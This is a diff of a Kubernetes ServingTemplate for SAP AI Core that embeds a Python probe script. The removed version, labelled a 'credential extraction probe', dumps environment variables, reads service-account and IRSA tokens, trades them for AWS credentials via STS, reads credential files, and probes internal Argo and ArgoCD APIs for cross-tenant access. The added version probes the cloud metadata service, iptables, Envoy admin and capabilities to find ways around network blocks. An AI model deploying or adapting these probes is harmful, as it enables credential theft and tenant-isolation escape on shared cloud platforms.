@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v9
+  name: impact-probe-v10
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v9"
+    scenarios.ai.sap.com/id: "impact-probe-v10"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v9"
-    executables.ai.sap.com/name: "impact-probe-v9"
-    executables.ai.sap.com/description: "credential extraction probe v9"
+    scenarios.ai.sap.com/name: "impact-probe-v10"
+    executables.ai.sap.com/name: "impact-probe-v10"
+    executables.ai.sap.com/description: "IMDS block mechanism probe v10"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,332 +28,143 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import os, ssl, socket, json, subprocess, glob, base64, time
-            import urllib.request, urllib.error, urllib.parse
+            import os, socket, subprocess, errno, ssl, time
+            import urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P9] {k}: {str(v)[:8000]}", flush=True)
+                print(f"[P10] {k}: {str(v)[:6000]}", flush=True)
 
-            def http_get(url, headers=None, timeout=12):
+            def run(cmd, timeout=8):
                 try:
-                    req = urllib.request.Request(url, headers=headers or {})
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
-                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
-                except urllib.error.HTTPError as e:
-                    body = ""
-                    try: body = e.read().decode("utf-8", errors="replace")[:2000]
-                    except: pass
-                    return f"HTTP_{e.code}:{body}", e.code, {}
-                except Exception as e:
-                    return f"ERR:{e}", 0, {}
-
-            def http_post(url, data, headers=None, timeout=12):
-                try:
-                    h = headers or {}
-                    if isinstance(data, str):
-                        data = data.encode()
-                    req = urllib.request.Request(url, data=data, headers=h, method="POST")
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
-                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
-                except urllib.error.HTTPError as e:
-                    body = ""
-                    try: body = e.read().decode("utf-8", errors="replace")[:2000]
-                    except: pass
-                    return f"HTTP_{e.code}:{body}", e.code, {}
-                except Exception as e:
-                    return f"ERR:{e}", 0, {}
-
-            def read_file(path):
-                try:
-                    with open(path, "rb") as f:
-                        raw = f.read()
-                    try:
-                        return raw.decode("utf-8", errors="replace")
-                    except:
-                        return base64.b64encode(raw).decode()
+                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
+                                                  timeout=timeout)
+                    return out.decode(errors="replace").strip()
+                except subprocess.TimeoutExpired:
+                    return "TIMEOUT"
+                except subprocess.CalledProcessError as e:
+                    return e.output.decode(errors="replace").strip()
                 except Exception as e:
                     return f"ERR:{e}"
 
-            def ls_tree(path, max_depth=4):
-                results = []
+            def http_req(method, url, headers=None, data=None, timeout=8):
                 try:
-                    out = subprocess.check_output(
-                        ["find", path, "-maxdepth", str(max_depth), "-not", "-path", "*/proc/*"],
-                        stderr=subprocess.DEVNULL, timeout=10
-                    ).decode(errors="replace")
-                    results = out.strip().split("\n")
+                    req = urllib.request.Request(url, data=data, headers=headers or {},
+                                                 method=method)
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                        return r.read().decode(errors="replace"), r.status, dict(r.headers)
+                except urllib.error.HTTPError as e:
+                    body = ""
+                    try: body = e.read().decode(errors="replace")[:2000]
+                    except: pass
+                    return f"HTTP_{e.code}:{body}", e.code, dict(e.headers)
                 except Exception as e:
-                    results = [f"ERR:{e}"]
-                return results
+                    return f"ERR:{type(e).__name__}:{e}", 0, {}
 
-            # ── 1. FULL ENVIRONMENT DUMP ──────────────────────────────────────────
-            report("---", "=== 1. FULL ENVIRONMENT VARIABLES ===")
-            env = dict(os.environ)
-            for k, v in sorted(env.items()):
-                report(f"ENV_{k}", v)
+            # ── 1. PROCESS LIST — confirm Istio sidecar presence ─────────────────
+            report("---", "=== 1. RUNNING PROCESSES (is Istio sidecar present?) ===")
+            report("PS_AUX", run("ps aux"))
+            report("LS_PROC_EXE", run("ls -la /proc/*/exe 2>/dev/null | grep -v 'No such\\|Permission' | head -30"))
 
-            # Flag high-value keys
-            interesting_keys = [
-                "AWS_ROLE_ARN", "AWS_WEB_IDENTITY_TOKEN_FILE", "AWS_ACCESS_KEY_ID",
-                "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
-                "AWS_CONTAINER_CREDENTIALS_FULL_URI", "AWS_CONTAINER_AUTHORIZATION_TOKEN",
-                "AI_CORE_STORAGE", "AICORE", "SAP_", "OBJECT_STORE",
-                "S3_", "STORAGE_", "TOKEN", "SECRET", "KEY", "PASS", "CREDENTIAL",
-                "KUBECONFIG", "KUBERNETES_", "SERVICE_ACCOUNT",
-            ]
-            found_interesting = {}
-            for k, v in env.items():
-                for prefix in interesting_keys:
-                    if prefix.upper() in k.upper():
-                        found_interesting[k] = v
-            report("ENV_HIGH_VALUE_SUMMARY", json.dumps(found_interesting, indent=2))
+            # ── 2. NETWORK INTERFACES ─────────────────────────────────────────────
+            report("---", "=== 2. NETWORK INTERFACES + ROUTES ===")
+            report("IP_ADDR", run("ip addr show"))
+            report("IP_ROUTE", run("ip route show"))
+            report("IP_ROUTE_ALL_TABLES", run("ip route show table all 2>/dev/null | head -60"))
+            report("IP_RULE", run("ip rule show"))
 
-            # ── 2. IRSA TOKEN CHECK ───────────────────────────────────────────────
-            report("---", "=== 2. IRSA / PROJECTED TOKENS ===")
-            token_paths = [
-                "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
-                "/var/run/secrets/kubernetes.io/serviceaccount/token",
-                "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
-                "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
-                "/run/secrets/eks.amazonaws.com/serviceaccount/token",
-                "/run/secrets/token",
-                "/var/run/secrets/token",
-            ]
-            found_tokens = {}
-            for p in token_paths:
-                content = read_file(p)
-                if not content.startswith("ERR:"):
-                    report(f"TOKEN_{p.replace('/','_')}", content[:4000])
-                    found_tokens[p] = content
+            # ── 3. IPTABLES NAT TABLE — Istio intercept rules ─────────────────────
+            report("---", "=== 3. IPTABLES RULES (Istio interception) ===")
+            for table in ["nat", "mangle", "filter"]:
+                out = run(f"iptables -L -n -v -t {table} 2>&1")
+                report(f"IPTABLES_{table.upper()}", out)
+            # Also try iptables-save for a cleaner view
+            report("IPTABLES_SAVE", run("iptables-save 2>&1 | head -120"))
 
-            # Check AWS_WEB_IDENTITY_TOKEN_FILE from env if set
-            token_file_env = os.environ.get("AWS_WEB_IDENTITY_TOKEN_FILE", "")
-            if token_file_env:
-                content = read_file(token_file_env)
-                report(f"IRSA_TOKEN_FROM_ENV_PATH", content[:4000])
-                found_tokens[token_file_env] = content
-
-            # ── 3. ATTEMPT STS AssumeRoleWithWebIdentity IF IRSA TOKEN FOUND ─────
-            report("---", "=== 3. STS ASSUME ROLE (if IRSA token available) ===")
-            irsa_token = None
-            irsa_role = os.environ.get("AWS_ROLE_ARN", "")
-            for p, tok in found_tokens.items():
-                if "eks.amazonaws.com" in p or "AWS_WEB_IDENTITY" in p:
-                    irsa_token = tok.strip()
-                    break
-
-            if irsa_token and irsa_role:
-                report("IRSA_ROLE_ARN", irsa_role)
-                report("IRSA_TOKEN_PREVIEW", irsa_token[:200])
-                # Decode JWT payload
+            # ── 4. RAW TCP CONNECT — exact errno for 169.254.169.254 ─────────────
+            report("---", "=== 4. RAW TCP CONNECT (errno analysis) ===")
+            IMDS_HOST = "169.254.169.254"
+            for port in [80, 443, 8080]:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(6)
                 try:
-                    parts = irsa_token.split(".")
-                    payload = base64.b64decode(parts[1] + "==").decode(errors="replace")
-                    report("IRSA_JWT_PAYLOAD", payload)
+                    s.connect((IMDS_HOST, port))
+                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "CONNECTED (open!)")
+                    # If we get here, send HTTP GET
+                    s.sendall(b"GET /latest/meta-data/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n")
+                    time.sleep(1)
+                    data = s.recv(4096)
+                    report(f"RAW_TCP_{IMDS_HOST}:{port}_RESPONSE", data.decode(errors="replace")[:1000])
+                    s.close()
+                except socket.timeout:
+                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "ETIMEDOUT (packet dropped/no reply — likely hop-limit or firewall)")
+                except ConnectionRefusedError:
+                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "ECONNREFUSED (TCP RST received — port closed at destination)")
+                except OSError as e:
+                    report(f"RAW_TCP_{IMDS_HOST}:{port}", f"OSError errno={e.errno} ({errno.errorcode.get(e.errno,'?')}): {e}")
                 except Exception as e:
-                    report("IRSA_JWT_DECODE_ERR", str(e))
-                # Call STS
-                sts_params = urllib.parse.urlencode({
-                    "Action": "AssumeRoleWithWebIdentity",
-                    "Version": "2011-06-15",
-                    "RoleArn": irsa_role,
-                    "RoleSessionName": "probe-v9",
-                    "WebIdentityToken": irsa_token,
-                    "DurationSeconds": "3600",
-                })
-                sts_body, sts_code, _ = http_post(
-                    "https://sts.amazonaws.com/",
-                    sts_params.encode(),
-                    headers={"Content-Type": "application/x-www-form-urlencoded"}
-                )
-                report("STS_RESPONSE", f"[{sts_code}] {sts_body[:3000]}")
-            elif irsa_token and not irsa_role:
-                report("IRSA_TOKEN_NO_ROLE", f"token found but no AWS_ROLE_ARN env var. Token preview: {irsa_token[:200]}")
-            else:
-                report("IRSA_STATUS", "No IRSA token found at expected paths")
+                    report(f"RAW_TCP_{IMDS_HOST}:{port}", f"{type(e).__name__}: {e}")
+                finally:
+                    try: s.close()
+                    except: pass
 
-            # ── 4. ECS CREDENTIAL PROVIDER (fallback) ────────────────────────────
-            report("---", "=== 4. ECS/CONTAINER CREDENTIAL PROVIDER ===")
-            ecs_rel = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
-            ecs_full = os.environ.get("AWS_CONTAINER_CREDENTIALS_FULL_URI", "")
-            ecs_auth = os.environ.get("AWS_CONTAINER_AUTHORIZATION_TOKEN", "")
-            if ecs_rel:
-                url = f"http://169.254.170.2{ecs_rel}"
-                body, code, _ = http_get(url)
-                report("ECS_CREDS_RELATIVE", f"[{code}] {body[:2000]}")
-            if ecs_full:
-                hdrs = {"Authorization": ecs_auth} if ecs_auth else {}
-                body, code, _ = http_get(ecs_full, headers=hdrs)
-                report("ECS_CREDS_FULL_URI", f"[{code}] {body[:2000]}")
-            if not ecs_rel and not ecs_full:
-                report("ECS_CREDS", "AWS_CONTAINER_CREDENTIALS_* not set")
+            # ── 5. IMDSv2 — PUT token request (different from GET) ───────────────
+            report("---", "=== 5. IMDSv2 PUT TOKEN REQUEST ===")
+            body, code, hdrs = http_req(
+                "PUT", "http://169.254.169.254/latest/api/token",
+                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
+                timeout=8
+            )
+            report("IMDS_PUT_TOKEN", f"[{code}] hdrs={dict(list(hdrs.items())[:6])} body={body[:500]}")
 
-            # ── 5. FILESYSTEM CREDENTIAL LOCATIONS ───────────────────────────────
-            report("---", "=== 5. MOUNTED SECRETS + CREDENTIAL FILES ===")
+            # ── 6. IMDS via different paths and methods ───────────────────────────
+            report("---", "=== 6. IMDS PATH/METHOD VARIATIONS ===")
+            for path in ["/latest/meta-data/", "/latest/dynamic/instance-identity/document",
+                         "/latest/user-data", "/", "/latest/"]:
+                body, code, hdrs = http_req("GET", f"http://169.254.169.254{path}", timeout=6)
+                report(f"IMDS_GET{path.replace('/','_')}", f"[{code}] {body[:300]}")
 
-            # Recursive listing of secret mount points
-            secret_dirs = [
-                "/var/run/secrets",
-                "/run/secrets",
-                "/etc/secret",
-                "/etc/secrets",
-                "/aicore",
-                "/sap",
-                "/platform",
-                "/bindings",
-                "/opt/app-root",
-                "/opt/secrets",
-                "/mnt/secrets",
-                "/mnt",
-                "/secrets",
-            ]
-            for d in secret_dirs:
-                if os.path.exists(d):
-                    files = ls_tree(d, max_depth=5)
-                    report(f"LS_{d.replace('/','_')}", "\n".join(files[:100]))
-                    # Read each file found (skip large/binary)
-                    for f in files:
-                        if os.path.isfile(f) and os.path.getsize(f) < 65536:
-                            content = read_file(f)
-                            report(f"FILE_{f.replace('/','_')}", content[:2000])
+            # ── 7. TRACEROUTE to 169.254.169.254 — how many hops before drop ─────
+            report("---", "=== 7. TRACEROUTE / TRACEPATH to IMDS ===")
+            report("TRACEROUTE_IMDS", run("traceroute -n -m 5 -w 2 169.254.169.254 2>&1", timeout=30))
+            report("TRACEPATH_IMDS",  run("tracepath -n 169.254.169.254 2>&1 | head -10", timeout=15))
 
-            # Standard AWS credential file
-            for aws_path in [
-                "/root/.aws/credentials",
-                "/root/.aws/config",
-                "/home/nobody/.aws/credentials",
-                os.path.expanduser("~/.aws/credentials"),
-                os.path.expanduser("~/.aws/config"),
-            ]:
-                content = read_file(aws_path)
-                if not content.startswith("ERR:"):
-                    report(f"AWS_CREDS_{aws_path.replace('/','_')}", content[:2000])
+            # ── 8. PING (ICMP) — does the address respond at L3? ─────────────────
+            report("---", "=== 8. ICMP PING ===")
+            report("PING_IMDS",    run("ping -c 3 -W 2 169.254.169.254 2>&1"))
+            report("PING_GATEWAY", run("ping -c 2 -W 2 169.254.1.1 2>&1"))
 
-            # ── 6. /proc/1/environ (PID 1 env — may differ from our shell env) ──
-            report("---", "=== 6. /proc/1/environ (PID1 environment) ===")
-            try:
-                with open("/proc/1/environ", "rb") as f:
-                    raw = f.read()
-                pairs = raw.split(b"\x00")
-                pid1_env = {}
-                for p in pairs:
-                    if b"=" in p:
-                        k, _, v = p.partition(b"=")
-                        pid1_env[k.decode(errors="replace")] = v.decode(errors="replace")
-                # Show all, highlight interesting
-                for k, v in sorted(pid1_env.items()):
-                    report(f"PID1_ENV_{k}", v[:1000])
-                interesting_pid1 = {k: v for k, v in pid1_env.items()
-                                    if any(x in k.upper() for x in ["AWS", "TOKEN", "SECRET", "KEY", "CRED", "SAP", "AI_CORE", "PASS", "S3", "STORAGE", "AICORE"])}
-                report("PID1_INTERESTING", json.dumps(interesting_pid1, indent=2))
-            except Exception as e:
-                report("PID1_ENVIRON_ERR", str(e))
+            # ── 9. /proc/net — TCP connection state table ─────────────────────────
+            report("---", "=== 9. /proc/net/tcp (kernel connection table) ===")
+            report("PROC_NET_TCP", run("cat /proc/net/tcp | head -30"))
+            report("PROC_NET_IF_INET6", run("cat /proc/net/if_inet6 2>/dev/null"))
+            # Kernel network stats
+            report("PROC_NET_NETSTAT", run("cat /proc/net/netstat | head -10"))
 
-            # ── 7. /proc/1/cmdline and /proc mounts ──────────────────────────────
-            report("---", "=== 7. /proc/1/cmdline + mount info ===")
-            try:
-                with open("/proc/1/cmdline", "rb") as f:
-                    cmdline = f.read().replace(b"\x00", b" ").decode(errors="replace")
-                report("PID1_CMDLINE", cmdline)
-            except Exception as e:
-                report("PID1_CMDLINE_ERR", str(e))
-            # Read mounts to find any exotic volume mounts
-            content = read_file("/proc/mounts")
-            report("PROC_MOUNTS", content[:4000])
-            # Also /proc/1/mounts
-            content = read_file("/proc/1/mounts")
-            report("PID1_MOUNTS", content[:4000])
+            # ── 10. CAPABILITIES — can we bypass iptables? ───────────────────────
+            report("---", "=== 10. CAPABILITIES ===")
+            report("CAP_CURRENT", run("cat /proc/self/status | grep -i cap"))
+            report("CAPSH", run("capsh --print 2>/dev/null || echo 'capsh not found'"))
 
-            # ── 8. ARGO WORKFLOW SERVER AUTH (HTTPS port 2746) ────────────────────
-            report("---", "=== 8. ARGO WORKFLOW SERVER gRPC/REST (port 2746) ===")
-            # We have XSUAA token from container env — check if AI_CORE injected it
-            xsuaa_token = os.environ.get("AI_CORE_TOKEN", os.environ.get("ACCESS_TOKEN", ""))
-            argo_ips = ["100.64.0.30", "100.64.80.37", "100.64.15.16"]
-            for ip in argo_ips:
-                # Try HTTPS (gRPC-gateway REST)
-                for path in ["/api/v1/info", "/api/v1/workflows/default", "/api/v1/namespaces",
-                              "/api/v1/userinfo", "/health", "/"]:
-                    # Without auth first
-                    body, code, hdrs = http_get(f"https://{ip}:2746{path}", timeout=6)
-                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
-                        report(f"ARGO_{ip}:2746{path.replace('/','_')}_noauth", f"[{code}] {body[:600]}")
-                    # With XSUAA if we have one
-                    if xsuaa_token:
-                        body2, code2, _ = http_get(f"https://{ip}:2746{path}",
-                                                    headers={"Authorization": f"Bearer {xsuaa_token}"}, timeout=6)
-                        if code2 != 0 and "ERR:timed" not in body2:
-                            report(f"ARGO_{ip}:2746{path.replace('/','_')}_bearer", f"[{code2}] {body2[:600]}")
-                # Also plain HTTP port 2746
-                body, code, hdrs = http_get(f"http://{ip}:2746/api/v1/info", timeout=5)
-                if code != 0 and "ERR:timed" not in body:
-                    report(f"ARGO_{ip}:2746_http_info", f"[{code}] {body[:400]}")
+            # ── 11. ISTIO ENVOY ADMIN PORT (15000) ───────────────────────────────
+            report("---", "=== 11. ISTIO ENVOY ADMIN (if sidecar present) ===")
+            body, code, _ = http_req("GET", "http://127.0.0.1:15000/clusters", timeout=4)
+            report("ENVOY_CLUSTERS", f"[{code}] {body[:2000]}")
+            body, code, _ = http_req("GET", "http://127.0.0.1:15000/config_dump", timeout=6)
+            report("ENVOY_CONFIG_DUMP_LEN", f"[{code}] response_len={len(body)} preview={body[:500]}")
+            body, code, _ = http_req("GET", "http://127.0.0.1:15000/stats?filter=imds", timeout=4)
+            report("ENVOY_STATS_IMDS", f"[{code}] {body[:1000]}")
+            # Envoy listener list
+            body, code, _ = http_req("GET", "http://127.0.0.1:15000/listeners", timeout=4)
+            report("ENVOY_LISTENERS", f"[{code}] {body[:2000]}")
 
-            # ── 9. ARGOCD SERVER API (port 8080/443) — cross-tenant apps ─────────
-            report("---", "=== 9. ARGOCD SERVER API ===")
-            argocd_server_ips = [
-                ("100.64.0.64",   8083, "argocd-server-infra"),
-                ("100.64.84.216", 8083, "argocd-server-tenants"),
-                ("100.64.80.49",  8083, "argocd-server-infra-2"),
-            ]
-            for ip, port, label in argocd_server_ips:
-                for path in ["/api/v1/session", "/api/v1/applications", "/api/v1/clusters",
-                              "/api/v1/repocreds", "/api/v1/repositories"]:
-                    body, code, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
-                    if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
-                        report(f"ARGOCD_{label}_{ip}:{port}{path.replace('/','_')}", f"[{code}] {body[:800]}")
+            # ── 12. CONNTRACK — what happens to 169.254.169.254 packets ──────────
+            report("---", "=== 12. CONNTRACK ===")
+            report("CONNTRACK_LIST", run("conntrack -L 2>&1 | head -20 || cat /proc/net/nf_conntrack 2>&1 | head -20"))
 
-            # ── 10. KUBERNETES API VIA kube-proxy (localhost) ─────────────────────
-            report("---", "=== 10. KUBE-PROXY LOCAL API ACCESS ===")
-            # kube-proxy may forward localhost:8001 to apiserver
-            for port in [8001, 8080, 6443]:
-                body, code, _ = http_get(f"http://127.0.0.1:{port}/api/v1/namespaces", timeout=4)
-                report(f"KUBEAPI_LOCAL_{port}", f"[{code}] {body[:400]}")
-
-            # ── 11. VELERO BACKUP STORAGE CREDENTIALS VIA CONFIGMAP SPECULATION ──
-            report("---", "=== 11. CLUSTER INTERNAL SERVICE DISCOVERY ===")
-            # Try to reach velero backup storage location endpoint
-            # Also try reading any mounted configmaps
-            for path in ["/etc/config", "/etc/configmap", "/app/config", "/app/application.properties",
-                         "/app/application.yaml", "/app/application.yml", "/config/application.yaml",
-                         "/opt/app/config.json", "/app/config.json"]:
-                if os.path.exists(path):
-                    if os.path.isdir(path):
-                        files = ls_tree(path, max_depth=3)
-                        report(f"DIR_{path.replace('/','_')}", "\n".join(files[:50]))
-                    else:
-                        content = read_file(path)
-                        report(f"CFGFILE_{path.replace('/','_')}", content[:2000])
-
-            # ── 12. DOWNWARD API / POD METADATA ──────────────────────────────────
-            report("---", "=== 12. DOWNWARD API + POD LABELS ===")
-            downward_paths = [
-                "/etc/podinfo/labels",
-                "/etc/podinfo/annotations",
-                "/etc/podinfo/namespace",
-                "/etc/podinfo/name",
-                "/etc/podinfo/uid",
-                "/etc/pod-info/labels",
-                "/etc/pod-info/annotations",
-                "/podinfo/labels",
-                "/podinfo/annotations",
-            ]
-            for p in downward_paths:
-                content = read_file(p)
-                if not content.startswith("ERR:"):
-                    report(f"DOWNWARD_{p.replace('/','_')}", content[:1000])
-
-            # ── 13. /etc/hosts and DNS ────────────────────────────────────────────
-            report("---", "=== 13. /etc/hosts + resolv.conf ===")
-            report("ETC_HOSTS", read_file("/etc/hosts"))
-            report("RESOLV_CONF", read_file("/etc/resolv.conf"))
-
-            report("DONE", "probe v9 complete")
+            report("DONE", "probe v10 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
